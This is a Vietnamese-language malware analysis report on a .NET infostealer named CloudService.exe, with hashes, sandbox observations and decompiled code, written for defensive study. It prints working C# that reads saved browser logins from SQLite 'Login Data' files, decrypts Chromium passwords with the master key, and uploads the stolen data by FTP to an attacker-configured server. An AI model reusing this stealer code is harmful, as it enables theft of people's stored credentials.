# Báo cáo phân tích Malware hàng tuần 


## I. Thông tin chung

| Stt | Thông tin | Nội dung |
| :---: | :------ |:--- |
| 1 | Ngày phân tích | 19/03/2025 |
| 2| Người phân tích | Nguyễn Bá Huy|
| 3 | Nguồn download | [Malware Bazaar](https://bazaar.abuse.ch/sample/e3aab9615b4fa6b1463e4d25a898bb1eb47fbe450c882d7309c4232f4d41aa45/) |
| 4|Tên tệp tin |CloudService.exe|
| 5| Kích thước| 89.5KB|
| 6| MD5| 25cd3aa2a4978a5b499f0f7b5c7bef8d|
| 7| SHA1 | 7fdac5932fcef63281ab2496f925d0cca2990bbb|
| 8| SHA256 | e3aab9615b4fa6b1463e4d25a898bb1eb47fbe450c882d7309c4232f4d41aa45|
| 9| Ngày đăng tải |2025-03-17 00:39:39 UTC|

## II. Môi trường phân tích 
### A. Môi trường phân tích
-  Máy ảo chạy trên VMware
-  Hệ điều hành Windows 10
-  Kết nối mạng Internet qua NAT
-  Có trình duyệt Firefox (chưa đăng nhập)
### B. Các công cụ
- Detect it easy
- Process Monitor
- JetBrains dotPeek





## III. Phân tích chi tiết 
### A. Phân tích động

#### 1. Hành vi 

|             Ảnh tệp tin              |
| :----------------------------------: |
| ![[Pasted image 20250806143330.png]] |




Chạy thử chương trình và không xuất hiện bất kỳ bất cửa sổ hay bất thường nào trên màn hình.

Theo dõi các thay đổi trên hệ thống
- Sử dụng `Proces Monitor`: Không phát hiện bất kỳ file hay dll nào được tạo ra


|           Process Monitor            |
| :----------------------------------: |
| ![[Pasted image 20250806143404.png]] |

Lọc sau khi chạy thì chỉ thấy chương trình được chạy nhiều lần, không phát hiện bất kỳ file exe và dll mới được tạo ra.

- Mở `Registry Editor`: Kiểm tra các mục liên quan đến thực thi chương trình tự động. Không phát hiện dấu hiệu chỉnh sửa. 

   
![[Pasted image 20250806143418.png]]
![[Pasted image 20250806143435.png]]
![[Pasted image 20250806143450.png]]
![[Pasted image 20250806143501.png]]
Ghi chú: Window Defend được tắt để cho phép mã độc thực thi các hành vi độc hại phục vụ quá trình phân tích

![[Pasted image 20250806143526.png]]
![[Pasted image 20250806143537.png]]


- Mở `Task Scheduler` : Không phát hiện các Task khả nghi

![[Pasted image 20250806143549.png]]



 #### **2. Phân tích kết quả**
 Không nhận thấy bất kỳ hành vi độc hại và bất thường khi chạy thử chương trình 
 
### B. Phân tích tĩnh 
#### 1. Mô tả tệp tin

Dùng công cụ `Detect It Easy` để tìm hiểu chương trình 

|            Detect It Easy            |
| :----------------------------------: |
| ![[Pasted image 20250806143608.png]] |
| ![[Pasted image 20250806143619.png]] |
 
 
 Ta thu được kết quả:
| Stt | Thông tin | Nội dung |
| :---: | :------ |:--- |
| 1 | Loại tệp| PE32 executable |
| 2| Packed |Không|
| 3| Compiler| Visual Basic .NET|
|4| Entropy|5.67146(70%)|
|5| Số section|3|

Chỉ import API `CorExeMain` từ `mscoree.dll` 





 #### **2. Phân tích mã nguồn của tệp tin**

Dùng `JetBrains dotPeek` để dịch ngược, ta thu được kết quả sau:

![[Pasted image 20250806143634.png]]

Kiểm tra từ `main()` của chương trình[](https://)

```csharp
 public static void Main()
    {
      UltraSpeed.isUserExpired();
      UltraSpeed.DisableWD();
      UltraSpeed.Taskmgr_Disabler();
      UltraSpeed.CMD_Disabler();
      UltraSpeed.Registeries_Disabler();
      UltraSpeed.Start();
      UltraSpeed.StartView();
      Application.Run();
    }
```
Hàm `main()` gọi tới 8 function, tiến hành kiểm tra lần lượt:


##### a. `isUserExpired():`
  - **Chức năng chính:** Kiểm tra nếu ngày hiện tại vượt quá `ExpireTimeDate` thì chương trình sẽ tự động thoát qua `Application.Exit()`
  
```csharp
    public static void isUserExpired()
    {
      try
      {
        if (DateTime.Compare(DateTime.ParseExact(UltraSpeed.ExpireTimeDate, "yyyy-MM-dd", (IFormatProvider) CultureInfo.InvariantCulture), DateTime.Now) >= 0)
          return;
        Application.Exit();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
```
      
##### b.  `DisableWD()`   `Taskmgr_Disabler()`
`CMD_Disabler()`  `Registeries_Disabler()` :
  - Trong trình dịch ngược không hiển thị nội dung của function, điều này có thể do đã bị obfuscate hoặc anti reverse. 
  - Thông qua tên hàm, có thể dự đoán chức năng của chúng lần lượt là vô hiệu hóa Window Defend, Task Manager, Command Prompt, Windows Registry Editor (regedit).
  

```csharp
    public static void DisableWD()
    {
    }

    public static void Taskmgr_Disabler()
    {
    }

    public static void CMD_Disabler()
    {
    }

    public static void Registeries_Disabler()
    {
    }
```
 ##### **c.  `Start()` :**
   - Gọi tới rất nhiều các function khác mà chúng chứa tên của rất nhiều các trình duyệt  

```csharp
public static void Start()
    {
      COVIDPickers.Chrome_Speed();
      COVIDPickers.Torch_Speed();
      COVIDPickers.CocCoc_Speed();
      COVIDPickers.QQ_Speed();
      COVIDPickers.xVast_Speed();
      COVIDPickers.QIPSurf_Speed();
      COVIDPickers.Microsoft_Speed();
      COVIDPickers.Chromium_Speed();
      COVIDPickers.Blisk_Speed();
      COVIDPickers.Brave_Speed();
      COVIDPickers.Nichrome_Speed();
      COVIDPickers.Kometa_Speed();
      COVIDPickers.Superbird_Speed();
      COVIDPickers.Opera_Speed();
      COVIDPickers.Comodo_Speed();
      COVIDPickers.Cent_Speed();
      COVIDPickers.Chedot_Speed();
      COVIDPickers.Ghost_Speed();
      COVIDPickers.Iron_Speed();
      COVIDPickers.UC_Speed();
      COVIDPickers.BlackHawk_Speed();
      COVIDPickers.Citrio_Speed();
      COVIDPickers.Uran_Speed();
      COVIDPickers.Falkon_Speed();
      COVIDPickers.Sputnik_Speed();
      COVIDPickers.CoolNovo_Speed();
      COVIDPickers.Chrome_Canary_Speed();
      COVIDPickers.Sleipnir_Speed();
      COVIDPickers.Kinzaa_Speed();
      COVIDPickers.Amigo_Speed();
      COVIDPickers.Epic_Speed();
      COVIDPickers.e360_English_Speed();
      COVIDPickers.e360_China_Speed();
      COVIDPickers.Vivaldi_Speed();
      COVIDPickers.Xpom_Speed();
      COVIDPickers.orbitum_Speed();
      COVIDPickers.Iridium_Speed();
      COVIDPickers.SevinStar_Speed();
      COVIDPickers.Outlook_Speed();
      COVIDPickers.Foxmail_Speed();
      MozilSpeed.FireFox();
      MozilSpeed.SeaMonkey();
      MozilSpeed.IceDragon();
      MozilSpeed.Thunderbird();
      COVIDPickers.FileZilla_Speed();
      COVIDPickers.WindowsKey_Speed();
    }
```

Các function đều có mục đích lấy cắp thông tin đăng nhập (username và password) được lưu trữ trong các trình duyệt. Ta sẽ phân tích từng phần:
- Xây dựng đường dẫn đến tệp `Login Data` của trình duyệt, nơi lưu trữ thông tin đăng nhập 

```csharp
string str1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Kinza\\User Data\\Default\\Login Data";

```
- Nếu tệp không tồn tại, function sẽ dừng lại 

```csharp!
if (!File.Exists(str1))
    return;
```

- Mở file SQLite và đọc bảng `logins` - bảng này chứa các thông tin các tài khoản đã lưu

```csharp!
SQLiteHandler sqLiteHandler = new SQLiteHandler(str1);
sqLiteHandler.ReadTable("logins");
```

- Đếm số lượng dòng trong bảng logins và duyệt qua từng dòng để lấy dữ liệu

```csharp!
int num = checked (sqLiteHandler.GetRowCount() - 1);
int row_num = 0;
while (row_num <= num)
```
- Chứa thông tin `URL`, `username`, `password`

```csharp!
string str2 = sqLiteHandler.GetValue(row_num, "origin_url");
string Left = sqLiteHandler.GetValue(row_num, "username_value");
string str3 = sqLiteHandler.GetValue(row_num, "password_value");
```


- Giải mã mật khẩu `password`
    - `COVIDPicker.isV10()` kiểm tra xem `str3` (password) có được mã bằng **Chromium V10 (AES-256 GCM)** hay không:
       - Nếu có thì lấy `masterKey` rồi giải mã mật khẩu
       - Nếu không sử dụng phương pháp khác để giải mã 

```csharp!
if (COVIDPickers.isV10(str3))
          {
            byte[] masterKey = COVIDPickers.GetMasterKey(Directory.GetParent(str1).Parent.FullName);
            if (masterKey != null)
              str3 = COVIDPickers.DecryptWithKey(Encoding.Default.GetBytes(str3), masterKey);
          }
          else
            str3 = COVIDPickers.Decrypttttt(Encoding.Default.GetBytes(sqLiteHandler.GetValue(row_num, "password_value")));
```

- Nếu tìm thấy **username** và **password** hợp lệ (không trống), chương trình sẽ format lại thông tin và lưu trữ vào `UltraSpeed.PasswordVault`


```csharp!

if (Operators.CompareString(Left, "", false) != 0 & Operators.CompareString(str3, "", false) != 0)
{
    string str4 = "\r\n============X============\r\nURL: " + str2 + "\r\nUsername: " + Left + "\r\nPassword: " + str3 + "\r\nApplication: Kinza\r\n=========================\r\n ";
    UltraSpeed.PasswordVault += str4;
}
```


- Đoạn bắt lỗi để không ảnh hưởng đến việc chạy chương trình 

```csharp!
catch (Exception ex)
{
    ProjectData.SetProjectError(ex);
    ProjectData.ClearProjectError();
}
```
Các function đều có cấu trúc mã nguồn tương tự. Chúng đều tìm thông tin đăng nhập và giải mã những thôn tin cần thiết rồi lưu trữ trong `UltraSpeed.PasswordVault`




 ##### **d.  `StartView()`** : Hàm gọi tới `EmptyBlocker()` và `NoBlocks()`

```csharp
  public static void StartView()
    {
      UltraSpeed.EmptyBlocker();
      UltraSpeed.NoBlocks();
    }
```



  -  `NoBlocks()` : Tiếp tục là một hàm chưa thể dịch ngược

```csharp
public static void NoBlocks()
    {
    }
```

- `EmptyBlocker()` : Chứa các function có tên mang ý nghĩa như các chức năng lấy cắp thông tin :

```csharp
    public static void EmptyBlocker()
    {
      if (Operators.CompareString(UltraSpeed.PasswordVault, "", false) == 0)
        return;
      UltraSpeed.SpeedOffPWExport();
      UltraSpeed.SpeedPassword();
      UltraSpeed.SpeedClipboard();
      UltraSpeed.SpeedScreenshot();
      UltraSpeed.SpeedKeylog();
    
```

- `SpeedOffPWExport()` : là một data exfiltration function (hàm thu thập và truyền tải dữ liệu) được thiết kế để lấy cắp thông tin từ máy nạn nhân và gửi đi theo nhiều giao thức khác nhau (FTP, Email, Telegram).
   -   **FTP Upload Section:**
         -   Kiểm tra xem liệu cấu hình có bật chế độ FTP (`#FTPEnabled`) hay không.
        - Nếu có, chương trình tạo một `FtpWebRequest `để upload file đến một server FTP.
        - `ftpWebRequest.Method = "STOR"` cho thấy phương thức dùng để lưu trữ dữ liệu trên server.
        - Dữ liệu được upload bao gồm: `UltraSpeed.TheInfo` và `UltraSpeed.PasswordVault`.
        - Mã hóa dữ liệu thành dạng chuỗi bằng `Encoding.UTF8.GetBytes()` và ghi vào stream `requestStream`.
        -   Mã nguồn chức năng gửi qua **Email** và **Telegram** tương tự.


```csharp!
 if (Operators.CompareString(UltraSpeed.QJDFjPqkSr, "#FTPEnabled", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (UltraSpeed.FTP_Domain + MyProject.Computer.Name + "P"), UltraSpeed.Encoder), (object) ".txt")
        }, (string[]) null, (Type[]) null, (bool[]) null);
        try
        {
          ftpWebRequest.Method = "STOR";
          ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(UltraSpeed.FTP_Username, UltraSpeed.FTP_Password);
          byte[] bytes = Encoding.UTF8.GetBytes("\r\n" + UltraSpeed.TheInfo + "\r\n" + UltraSpeed.PasswordVault + "\r\n\r\n\r\n\r\n\r\n--------------------------------------------------");
          ftpWebRequest.ContentLength = (long) bytes.Length;
          using (Stream requestStream = ftpWebRequest.GetRequestStream())
          {
            requestStream.Write(bytes, 0, bytes.Length);
            requestStream.Close();
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
          return;
        }
      }
```





  
 - `SpeedClipboard()`, `SpeedScreenshot()`,  `SpeedKeylog()`, `SpeedPassword()` đều là các method rỗng do đã bị obfucate nên việc tiếp tục trace là không phù hợp, tiến hành tìm các method chứa chức năng tương tự như tên của chúng, ta tìm được các chức năng sau:
 
    - `KeyLogger()` : Ghi lại ký tự người dùng nhập từ bàn phím

     
    - `Clipboard()` : Lấy thông tin mà người dùng copy được lưu trong `Clipboard()` 
    
    
    - `Screenshot()` : Chụp ảnh màn hình trên thiết bị nạn nhân
    
Các file thông tin sau khi được gửi đi sẽ bị xóa ngay lập tức.

## IV. IOCs
#### Mã hash
|Mã hash|Nội dung|
|:---:|:---|
|MD5|25cd3aa2a4978a5b499f0f7b5c7bef8d|
|SHA1|7fdac5932fcef63281ab2496f925d0cca2990bbb|
|SHA256|e3aab9615b4fa6b1463e4d25a898bb1eb47fbe450c882d7309c4232f4d41aa45|


## V. Tổng kết

### Về kỹ thuật:
Mã độc sử dụng các kỹ thuật Obfucate gây cản trở trong quá trình phân tích tĩnh, khi chạy chương trình không thấy bất kỳ giấu hiệu độc nào. Điều này có thể do mã độc được chạy trên môi trường Sandbox máy ảo, chưa kiểm tra trực tiếp trên máy người dùng thông thường nên vẫn cần cẩn thận suy luận và xem xét các chức năng của chương trình.

### Về mục đích:
Mã độc `CloudService.exe` mục đích nhắm vào tài khoản trình duyệt của người dùng. Nó là chương trình thực hiện các chức năng
- Lấy thông tin của các trình duyệt
- Chụp màn hình, ghi lại bàn phím, sao chép Clipboard,...



### Bài học rút ra: 
* Không tùy tiện mở tệp khi chưa rõ nguồn gốc.
* Không tùy tiện cấp quyền khi có cảnh báo chương trình khả nghi
* Không tải các chương trình, phần mềm crack từ nguồn không chính thống.
* Chú ý các tiến trình lạ sỉnh ra khi chạy chương trình.
* Cập nhật phần mềm diệt virus thường xuyên để quét được các mã độc mới.
* Ngắt kết nối mạng khi phát hiện bị nhiễm mã độc, tránh lây lây lan, thất thoát dữ liệu.
* Quét virus các thiết bị USB trước khi kết nối với máy tính.
* Quét virus thường xuyên để phát hiện kịp thời mã độc tồn tại trên máy.
